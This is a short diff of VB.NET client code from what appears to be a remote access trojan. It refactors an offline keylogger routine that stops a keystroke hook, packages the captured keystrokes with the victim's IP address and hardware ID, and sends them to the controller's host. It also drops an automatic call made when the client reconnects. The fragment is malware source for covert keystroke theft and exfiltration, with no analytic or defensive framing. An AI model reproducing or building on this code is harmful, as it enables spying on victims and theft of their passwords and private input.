@@ -68,10 +68,10 @@ Namespace Client
             Return False
         End Function
 
-        Private Sub StopOfflineKeyLogger()
-            Plugin.Launch.StopHook()
-            Plugin.Launch.ClientSender(StarterClass.clientHandler.host, Config.generalKey, New KeylogOfflinePacket(Plugin.Launch.CurrentKeyStroke(), StarterClass.clientHandler.baseIp, StarterClass.clientHandler.HWID))
-            Plugin.Launch.ClearKeyStroke()
+        Friend Shared Sub StopOfflineKeyLogger()
+            Offline.Keyloggers.Launch.StopHook()
+            Offline.Keyloggers.Launch.ClientSender(StarterClass.clientHandler.host, Config.generalKey, New KeylogOfflinePacket(Offline.Keyloggers.Launch.CurrentKeyStroke(), StarterClass.clientHandler.baseIp, StarterClass.clientHandler.HWID))
+            Offline.Keyloggers.Launch.ClearKeyStroke()
             StarterClass.KeylogOn = False
         End Sub
 
@@ -84,9 +84,6 @@ Namespace Client
                 Me.HWID = connectionPacket.HWID
                 Me.baseIp = socket.LocalEndPoint.ToString()
                 SendPacket(connectionPacket)
-                If StarterClass.KeylogOn Then
-                    StopOfflineKeyLogger()
-                End If
                 Receive()
             Else
                 ConnectStart()
